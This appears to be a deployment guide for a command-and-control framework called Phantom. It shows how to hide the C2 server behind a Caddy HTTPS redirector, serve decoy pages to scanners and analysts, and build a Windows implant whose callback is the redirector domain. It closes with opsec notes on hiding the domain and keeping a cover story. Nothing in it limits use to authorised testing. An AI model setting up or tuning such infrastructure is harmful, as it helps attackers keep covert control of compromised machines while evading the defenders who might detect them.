# Redirector Setup for Phantom C2

A redirector is a public HTTPS front that hides the real C2 server IP. The
implant only ever talks to the redirector's domain; the redirector forwards
C2 traffic to the actual Phantom listener over a private link.

```
 implant ──HTTPS(443)──▶ Caddy redirector ──HTTP(8080)──▶ Phantom listener
        (public domain)   (public IP / VPS)              (internal host)
```

Non-C2 visitors (scanners, analysts) get a decoy page instead of the C2 API.

## 1. Prerequisites

- A public domain whose DNS `A`/`AAAA` record points at the redirector host
  (ports 80 and 443 must be reachable).
- Docker + `docker compose` on the redirector host.
- Phantom server running and reachable from that host (default HTTP listener
  on port 8080).

## 2. Configure

```bash
cd deployments/redirector
cp .env.example .env
# edit .env:
#   C2_DOMAIN=your-domain.com
```

The Caddyfile routes these paths to the Phantom listener and serves a decoy
for everything else:

| Path | Purpose |
|---|---|
| `/api/v1/*` | Phantom agent register + check-in |
| `/cdn-cgi/*`, `/common/oauth2/*`, `/app/*` | optional alternate fronting paths |
| everything else | decoy / landing page |

## 3. (Optional) Landing page

Drop a static `index.html` (and assets) into `deployments/redirector/site/`.
It is served by Caddy for non-C2 paths. This directory is gitignored so you
can keep site-specific branding local.

## 4. Start

```bash
cd deployments/redirector
docker compose up -d
```

Caddy obtains a Let's Encrypt certificate for `www.<C2_DOMAIN>` automatically
and renews it. HTTP is redirected to HTTPS.

## 5. Verify

```bash
# decoy/landing page
curl -s https://www.<C2_DOMAIN>/

# C2 path should forward to Phantom (returns its JSON)
curl -s https://www.<C2_DOMAIN>/api/v1/auth
```

## 6. Point the implant at the redirector

Build the agent with the public domain as its callback:

```bash
make agent-windows LISTENER_URL=https://www.<C2_DOMAIN> SLEEP=10 JITTER=20
```

The Phantom transport appends `/api/v1/auth` (register) and `/api/v1/status`
(check-in), both of which the Caddyfile forwards. No agent change is needed
beyond the `LISTENER_URL`.

## 7. (Optional) Server-side redirector profile

`configs/profiles/redirector.yaml` provides host-header validation, URI
rotation, realistic headers, and a decoy response at the *server* layer for
when you want the listener itself to only accept redirector-routed traffic.
Point a listener at it in `configs/server.yaml`:

```yaml
listeners:
  - name: "redirector-backend"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "redirector"
```

## 8. Opsec notes

- Keep `C2_DOMAIN` only in the gitignored `.env`, never in the Caddyfile.
- The decoy/landing page should match the domain's cover story.
- For a bare decoy (no landing page), use the plain `respond` form in the
  Caddyfile instead of `file_server`.
- The default upstream `172.17.0.1:8080` is the Docker host gateway — set
  `C2_UPSTREAM` if the Phantom listener lives elsewhere.
